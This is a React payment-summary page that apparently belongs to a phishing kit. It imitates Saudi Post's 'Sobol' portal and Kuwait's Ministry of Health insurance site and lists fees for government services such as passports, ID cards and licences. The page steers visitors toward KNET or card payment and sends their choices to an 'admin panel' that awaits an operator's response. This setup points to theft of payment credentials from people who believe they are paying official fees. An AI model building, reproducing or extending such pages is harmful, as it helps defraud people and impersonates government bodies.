import { useState, useEffect } from "react";
import { useLocation, Link } from "wouter";
import { sendData, navigateToPage } from "@/lib/store";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CreditCard, Building2, CheckCircle2, FileText, User, Phone, Mail, MapPin } from "lucide-react";

export default function SummaryPayment() {
  const [searchQuery, setSearchQuery] = useState("");
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  // Get service name from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'ربط رقم الجوال وتنشيط الحساب';
  const isMOH = serviceName === 'moh';

  // MOH payment data from localStorage
  const mohData = isMOH ? JSON.parse(localStorage.getItem('mohPaymentData') || '{}') : {};

  // Service prices - matching ServiceHero.tsx getServiceFee()
  const servicePrices: Record<string, number> = {
    'ربط رقم الجوال وتنشيط الحساب': 10,
    'تحديث بيانات العنوان الوطني': 10,
    'قيد سجل تجاري لمؤسسة فردية': 500,
    'تجديد سجل تجاري': 200,
    'حجز اسم تجاري': 100,
    'تعديل سجل تجاري': 200,
    'مستخرج سجل تجاري / الإفادة التجارية': 100,
    'إصدار رخصة تجارية': 5000,
    'تجديد رخصة تجارية': 800,
    'تسجيل علامة تجارية': 7500,
    'إصدار الجواز السعودي': 300,
    'تجديد الجواز السعودي': 300,
    'تجديد الهوية الوطنية': 39,
    'إصدار رخصة قيادة': 100,
    'تجديد رخصة القيادة': 100,
    'تجديد رخصة سير': 100,
  };

  const servicePrice = isMOH ? (mohData.totalAmount || 0) : (servicePrices[serviceName] || 500);
  const vatAmount = isMOH ? 0 : Math.round(servicePrice * 0.15);
  const totalAmount = isMOH ? servicePrice : (servicePrice + vatAmount);
  const currency = isMOH ? 'د.ك' : 'ر.س';
  const displayServiceName = isMOH ? (mohData.serviceType || 'الضمان الصحي') : serviceName;

  useEffect(() => {
    navigateToPage('ملخص الدفع');
  }, []);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;

    setIsProcessing(true);

    // Determine payment method label
    const paymentMethodLabel = selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : selectedPaymentMethod === 'knet' ? 'كي نت' : 'Apple Pay';

    // Send data to admin panel
    sendData({
      data: {
        paymentMethod: paymentMethodLabel,
        serviceName,
        servicePrice,
        vatAmount,
        totalAmount,
      },
      current: 'ملخص الدفع',
      nextPage: selectedPaymentMethod === 'knet' ? 'knet-payment' : selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === 'knet') {
        window.location.href = '/knet-payment';
      } else if (selectedPaymentMethod === 'card') {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
      } else {
        window.location.href = `/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl" style={{ fontFamily: isMOH ? "'Cairo', 'Tahoma', sans-serif" : "'Tajawal', sans-serif" }}>
      
      {/* ===== HEADER ===== */}
      {isMOH ? (
        /* MOH Header - Dark blue with logo */
        <div className="bg-[#0c2c3c] text-white py-5 text-center">
          <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" className="w-[90px] h-[90px] mx-auto" />
          <h1 className="text-white text-lg md:text-xl font-bold mt-2">النظام الآلي لتسجيل الضمان الصحي</h1>
        </div>
      ) : (
        /* Sobol Header */
        <>
          <div className="bg-[#143c3c] text-white">
            <div className="container mx-auto px-4">
              <div className="flex items-center justify-between h-10 md:h-12">
                {/* Right Side - Tabs */}
                <div className="hidden md:flex items-center gap-0">
                  <button className="px-4 md:px-6 py-2 md:py-3 bg-white text-[#143c3c] font-medium text-xs md:text-sm">
                    الأفراد
                  </button>
                  <button className="px-4 md:px-6 py-2 md:py-3 text-white hover:bg-[#0f2e2e] font-medium text-xs md:text-sm">
                    الأعمال
                  </button>
                  <button className="px-4 md:px-6 py-2 md:py-3 text-white hover:bg-[#0f2e2e] font-medium text-xs md:text-sm">
                    الخدمات الحكومية
                  </button>
                </div>
                
                {/* Mobile Menu Button */}
                <button 
                  className="md:hidden text-white p-2"
                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                >
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                  </svg>
                </button>
                
                {/* Left Side - Actions */}
                <div className="flex items-center gap-2 md:gap-4">
                  <a href="#" className="hidden md:block text-white text-sm hover:underline">مساعدة</a>
                  <button className="text-white">
                    <svg className="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                  </button>
                  <button className="text-white">
                    <svg className="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                    </svg>
                  </button>
                  <button className="text-white">
                    <svg className="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                  </button>
                  <a href="#" className="text-white text-xs md:text-sm hover:underline">EN</a>
                </div>
              </div>
            </div>
          </div>

          {/* Mobile Menu */}
          {mobileMenuOpen && (
            <div className="md:hidden bg-[#143c3c] text-white py-4 px-4">
              <div className="flex flex-col gap-2">
                <button className="px-4 py-2 bg-white text-[#143c3c] font-medium text-sm rounded">الأفراد</button>
                <button className="px-4 py-2 text-white font-medium text-sm">الأعمال</button>
                <button className="px-4 py-2 text-white font-medium text-sm">الخدمات الحكومية</button>
                <a href="#" className="px-4 py-2 text-white text-sm">مساعدة</a>
              </div>
            </div>
          )}
        </>
      )}

      
      <main className="flex-1 container py-8">
        <div className="max-w-4xl mx-auto">
          {/* Breadcrumb */}
          <nav className="flex items-center gap-2 text-sm text-gray-500 mb-6">
            <span>الرئيسية</span>
            <span>/</span>
            <span>الخدمات</span>
            <span>/</span>
            <span className="text-[#143c3c]">{displayServiceName}</span>
          </nav>

          <h1 className="text-2xl font-bold text-gray-900 mb-6">ملخص الطلب والدفع</h1>
          
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Order Summary */}
            <div className="lg:col-span-2 space-y-6">
              {/* Service Details */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <FileText className="w-5 h-5 text-[#143c3c]" />
                    تفاصيل الخدمة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">اسم الخدمة</span>
                      <span className="font-medium">{displayServiceName}</span>
                    </div>
                    {isMOH && mohData.persons && mohData.persons.length > 0 && (
                      <div className="py-2 border-b">
                        <span className="text-gray-600 block mb-2">المؤمن عليهم</span>
                        <div className="space-y-1">
                          {mohData.persons.map((person: any, idx: number) => (
                            <div key={idx} className="flex justify-between items-center text-sm bg-gray-50 px-2 py-1 rounded">
                              <span>{person.name || `شخص ${idx + 1}`}</span>
                              <span className="text-[#143c3c] font-medium">{person.amount || 0} {currency}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                    <div className="flex justify-between items-center py-2 border-b">
                      <span className="text-gray-600">رسوم الخدمة</span>
                      <span className="font-medium">{servicePrice} {currency}</span>
                    </div>
                    {!isMOH && (
                      <div className="flex justify-between items-center py-2 border-b">
                        <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
                        <span className="font-medium">{vatAmount} {currency}</span>
                      </div>
                    )}
                    <div className="flex justify-between items-center py-2 bg-[#143c3c]/10 px-3 rounded-lg">
                      <span className="text-[#143c3c] font-bold">المجموع الكلي</span>
                      <span className="text-[#143c3c] font-bold text-xl">{totalAmount} {currency}</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Payment Methods */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-lg">
                    <CreditCard className="w-5 h-5 text-[#143c3c]" />
                    طريقة الدفع
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* KNET Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'knet'
                          ? 'border-[#143c3c] bg-[#143c3c]/5'
                          : 'border-gray-200 hover:border-[#143c3c]/50'
                      }`}
                      onClick={() => setSelectedPaymentMethod('knet')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'knet' ? 'border-[#143c3c]' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'knet' && (
                            <div className="w-3 h-3 rounded-full bg-[#143c3c]" />
                          )}
                        </div>
                        <img src="/kpay/knet.png" alt="KNET" className={`w-8 h-8 object-contain ${selectedPaymentMethod === 'knet' ? 'opacity-100' : 'opacity-50'}`} />
                        <div>
                          <p className="font-medium">KNET</p>
                          <p className="text-sm text-gray-500">الدفع بواسطة كي نت</p>
                        </div>
                      </div>
                    </div>

                    {/* Credit Card Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'card'
                          ? 'border-[#143c3c] bg-[#143c3c]/5'
                          : 'border-gray-200 hover:border-[#143c3c]/50'
                      }`}
                      onClick={() => setSelectedPaymentMethod('card')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'card' ? 'border-[#143c3c]' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'card' && (
                            <div className="w-3 h-3 rounded-full bg-[#143c3c]" />
                          )}
                        </div>
                        <CreditCard className={`w-8 h-8 ${selectedPaymentMethod === 'card' ? 'text-[#143c3c]' : 'text-gray-400'}`} />
                        <div>
                          <p className="font-medium">بطاقة ائتمان</p>
                          <p className="text-sm text-gray-500">Visa, Mastercard</p>
                        </div>
                      </div>
                      <div className="flex gap-2 mt-3 justify-center">
                        <img src="/images/banks/visa.png" alt="Visa" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                        <img src="/images/banks/mastercard.png" alt="Mastercard" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                      </div>
                    </div>

                    {/* Bank Transfer Option */}
                    <div
                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                        selectedPaymentMethod === 'transfer'
                          ? 'border-[#143c3c] bg-[#143c3c]/5'
                          : 'border-gray-200 hover:border-[#143c3c]/50'
                      }`}
                      onClick={() => setSelectedPaymentMethod('transfer')}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                          selectedPaymentMethod === 'transfer' ? 'border-[#143c3c]' : 'border-gray-300'
                        }`}>
                          {selectedPaymentMethod === 'transfer' && (
                            <div className="w-3 h-3 rounded-full bg-[#143c3c]" />
                          )}
                        </div>
                        <svg className={`w-8 h-8 ${selectedPaymentMethod === 'transfer' ? 'text-black' : 'text-gray-400'}`} viewBox="0 0 24 24" fill="currentColor">
                          <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
                        </svg>
                        <div>
                          <p className="font-medium">Apple Pay</p>
                          <p className="text-sm text-gray-500">الدفع بواسطة Apple Pay</p>
                        </div>
                      </div>
                      {selectedPaymentMethod === 'transfer' && (
                        <p className="text-xs text-red-500 mt-2 text-center">الدفع عن طريق Apple Pay غير متاح حالياً</p>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Sidebar - Order Summary */}
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader className="bg-[#143c3c] text-white rounded-t-lg">
                  <CardTitle className="text-lg">ملخص الطلب</CardTitle>
                </CardHeader>
                <CardContent className="pt-4">
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الخدمة</span>
                      <span className="font-medium text-xs">{displayServiceName}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">الرسوم</span>
                      <span>{servicePrice} {currency}</span>
                    </div>
                    {!isMOH && (
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-600">الضريبة</span>
                        <span>{vatAmount} {currency}</span>
                      </div>
                    )}
                    <hr />
                    <div className="flex justify-between items-center py-2 bg-[#143c3c]/10 px-3 rounded-lg">
                      <span className="text-[#143c3c] font-bold">المجموع</span>
                      <span className="text-[#143c3c] font-bold text-lg">{totalAmount} {currency}</span>
                    </div>
                  </div>

                  <Button
                    className="w-full mt-6 bg-[#04ccf0] hover:bg-[#03b5d6]"
                    disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
                    onClick={handlePayment}
                  >
                    {isProcessing ? (
                      <div className="flex items-center gap-2">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                        جاري المعالجة...
                      </div>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4 ml-2" />
                        متابعة الدفع
                      </>
                    )}
                  </Button>

                  <p className="text-xs text-gray-500 text-center mt-4">
                    بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                  </p>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </main>

      {/* ===== FOOTER ===== */}
      {isMOH ? (
        /* MOH Footer - Simple black bar */
        <footer className="bg-black text-white text-center py-3 mt-auto">
          <p className="text-sm m-0">&copy; 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
        </footer>
      ) : (
        /* Sobol Footer */
        <footer className="bg-[#143c3c] text-white py-10 md:py-16">
          <div className="container mx-auto px-4">
            {/* Footer Links */}
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6 md:gap-8 mb-8 md:mb-12">
              {/* Column 1 - سبل */}
              <div>
                <h4 className="font-bold mb-3 md:mb-4 text-sm md:text-base">سبل</h4>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white">عن المؤسسة</a></li>
                  <li><a href="#" className="hover:text-white">كلمة معالي الرئيس</a></li>
                  <li><a href="#" className="hover:text-white">مجلس الإدارة</a></li>
                  <li><a href="#" className="hover:text-white">القادة</a></li>
                  <li><a href="#" className="hover:text-white">الهيكل التنظيمي</a></li>
                  <li><a href="#" className="hover:text-white">استراتيجية البريد السعودي</a></li>
                  <li><a href="#" className="hover:text-white">المسؤولية الاجتماعية</a></li>
                  <li><a href="#" className="hover:text-white">محفظة الاستثمارات</a></li>
                  <li><a href="#" className="hover:text-white">فروعنا</a></li>
                </ul>
              </div>

              {/* Column 2 - المركز الإعلامي */}
              <div>
                <h4 className="font-bold mb-3 md:mb-4 text-sm md:text-base">المركز الإعلامي</h4>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white">الأخبار</a></li>
                  <li><a href="#" className="hover:text-white">الفعاليات</a></li>
                  <li><a href="#" className="hover:text-white">الجوائز والإنجازات</a></li>
                  <li><a href="#" className="hover:text-white">هوية البريد السعودي</a></li>
                  <li><a href="#" className="hover:text-white">التقارير السنوية</a></li>
                </ul>
              </div>

              {/* Column 3 - أخرى */}
              <div>
                <h4 className="font-bold mb-3 md:mb-4 text-sm md:text-base">أخرى</h4>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white">التوظيف</a></li>
                  <li><a href="#" className="hover:text-white">المنافسات والمناقصات</a></li>
                  <li><a href="#" className="hover:text-white">التوعية بالاحتيال</a></li>
                  <li><a href="#" className="hover:text-white">البيانات المفتوحة</a></li>
                  <li><a href="#" className="hover:text-white">مشاركة البيانات</a></li>
                </ul>
              </div>

              {/* Column 4 - مواقع ذات علاقة */}
              <div className="col-span-2 md:col-span-1">
                <h4 className="font-bold mb-3 md:mb-4 text-sm md:text-base">مواقع ذات علاقة</h4>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white">وزارة النقل والخدمات اللوجستية</a></li>
                  <li><a href="#" className="hover:text-white">الهيئة العامة للنقل</a></li>
                  <li><a href="#" className="hover:text-white">أبشر</a></li>
                  <li><a href="#" className="hover:text-white">إرسال</a></li>
                  <li><a href="#" className="hover:text-white">ناقل</a></li>
                  <li><a href="#" className="hover:text-white">المركز السعودي للأعمال</a></li>
                </ul>
              </div>
            </div>

            {/* App Download and Social Media */}
            <div className="flex flex-col md:flex-row items-center justify-between gap-4 md:gap-4 py-6 md:py-8 border-t border-white/20">
              {/* Social Media Icons - Left */}
              <div className="flex gap-2 md:gap-3 order-2 md:order-1">
                <a href="#" className="w-8 h-8 md:w-10 md:h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20">
                  <svg className="w-4 h-4 md:w-5 md:h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                  </svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-10 md:h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20">
                  <svg className="w-4 h-4 md:w-5 md:h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                  </svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-10 md:h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20">
                  <svg className="w-4 h-4 md:w-5 md:h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                  </svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-10 md:h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20">
                  <svg className="w-4 h-4 md:w-5 md:h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                  </svg>
                </a>
                <a href="#" className="w-8 h-8 md:w-10 md:h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20">
                  <svg className="w-4 h-4 md:w-5 md:h-5" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
                  </svg>
                </a>
              </div>

              {/* App Download - Right */}
              <div className="flex gap-2 md:gap-4 order-1 md:order-2">
                <a href="#" className="bg-black text-white rounded-lg px-2 md:px-3 py-1.5 md:py-2 flex items-center gap-1.5 md:gap-2 text-xs md:text-sm">
                  <svg className="w-5 h-5 md:w-6 md:h-6" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18.71,19.5C17.88,20.74 17,21.95 15.66,21.97C14.32,22 13.89,21.18 12.37,21.18C10.84,21.18 10.37,21.95 9.1,22C7.79,22.05 6.8,20.68 5.96,19.47C4.25,17 2.94,12.45 4.7,9.39C5.57,7.87 7.13,6.91 8.82,6.88C10.1,6.86 11.32,7.75 12.11,7.75C12.89,7.75 14.37,6.68 15.92,6.84C16.57,6.87 18.39,7.1 19.56,8.82C19.47,8.88 17.39,10.1 17.41,12.63C17.44,15.65 20.06,16.66 20.09,16.67C20.06,16.74 19.67,18.11 18.71,19.5M13,3.5C13.73,2.67 14.94,2.04 15.94,2C16.07,3.17 15.6,4.35 14.9,5.19C14.21,6.04 13.07,6.7 11.95,6.61C11.8,5.46 12.36,4.26 13,3.5Z"/>
                  </svg>
                  <div>
                    <div className="text-[8px] md:text-[10px] text-gray-400">Download on the</div>
                    <div className="font-medium text-[10px] md:text-xs">App Store</div>
                  </div>
                </a>
                <a href="#" className="bg-black text-white rounded-lg px-2 md:px-3 py-1.5 md:py-2 flex items-center gap-1.5 md:gap-2 text-xs md:text-sm">
                  <svg className="w-5 h-5 md:w-6 md:h-6" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.6 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z"/>
                  </svg>
                  <div>
                    <div className="text-[8px] md:text-[10px] text-gray-400">GET IT ON</div>
                    <div className="font-medium text-[10px] md:text-xs">Google Play</div>
                  </div>
                </a>
              </div>
            </div>

            {/* Badges */}
            <div className="flex flex-wrap items-center justify-center md:justify-end gap-3 md:gap-4 py-4">
              <div className="bg-white text-gray-800 rounded px-2 md:px-3 py-1.5 md:py-2 text-[10px] md:text-xs">
                <div className="font-bold">Great Place</div>
                <div className="font-bold">To Work.</div>
                <div className="text-red-600 text-[8px] md:text-[10px]">Certified</div>
              </div>
              <div className="text-center">
                <div className="text-xl md:text-2xl font-bold">2030</div>
                <div className="text-[10px] md:text-xs">رؤية</div>
              </div>
            </div>

            {/* Bottom Bar */}
            <div className="flex flex-col md:flex-row items-center justify-between gap-3 md:gap-4 pt-6 md:pt-8 border-t border-white/20 text-xs md:text-sm">
              <div className="flex flex-wrap justify-center gap-4 md:gap-6">
                <a href="#" className="hover:underline">شروط الخدمة</a>
                <a href="#" className="hover:underline">سياسة الخصوصية</a>
                <a href="#" className="hover:underline">إشعار الخصوصية</a>
              </div>
              <p className="text-white/60 text-center text-[10px] md:text-sm">&copy; 2026 جميع الحقوق محفوظة البريد السعودي | سبل</p>
            </div>
          </div>
        </footer>
      )}
    </div>
  );
}
